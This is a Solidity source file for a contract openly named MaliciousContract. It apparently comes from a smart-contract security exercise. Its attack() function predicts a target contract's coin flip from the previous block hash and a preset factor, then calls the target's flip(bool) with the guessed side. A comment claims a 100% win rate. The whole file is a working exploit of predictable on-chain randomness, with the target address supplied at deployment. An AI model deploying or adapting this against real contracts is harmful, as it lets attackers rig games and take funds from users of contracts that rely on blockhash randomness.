// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract MaliciousContract {
    address payable public vulnerableScAddress;
    address payable public attacker;
    uint256 public factor;

    constructor(address payable _vulnerableScAddress, uint256 _factor) {
        vulnerableScAddress = _vulnerableScAddress;
        attacker = payable(msg.sender);
        factor = _factor;
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / factor;
        bool side = coinFlip == 1 ? true : false;

        // 100% chances of guessing flip, as we have precalculated the values.
        vulnerableScAddress.call(abi.encodeWithSignature("flip(bool)", side));
    }
}
